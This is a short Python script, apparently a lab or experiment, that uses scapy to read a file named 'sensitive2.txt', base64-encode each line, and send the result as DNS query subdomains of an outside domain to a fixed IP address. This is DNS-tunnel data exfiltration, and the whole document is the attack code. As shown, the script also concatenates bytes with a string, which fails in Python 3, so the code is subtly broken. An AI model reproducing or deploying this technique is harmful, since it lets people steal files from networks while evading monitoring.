import random
import base64
import sys
from scapy.all import *
from struct import unpack

#def readchunk(file_obj, chunk_size):
 #   while True:
 #       data = file_obj.read(chunk_size)
 #       if not data:
 #           break
 #       yield data

def sender():

   # f=open('sensitive.txt')
   # for piece in readchunk(f,10):

        
    with open('sensitive2.txt') as f:
        for line in f:
         #   s=f.read()
    #print type(s)
    #        print s

            print(line)
            data = base64.b64encode(line.encode())
            #data = line.encode()
            print(data)
            myqname = data + '.newmediaexpress.co.kr'
            tranid = random.randint(0,65535)
            myqname = myqname.replace("\n","")
            myqname = myqname.replace(" ","")
            pkt = IP(dst="192.168.188.129")/UDP(dport=53)/DNS(rd=1,id=tranid,qd=DNSQR(qname=myqname))
            send(pkt)
            #print id_payload
sender()
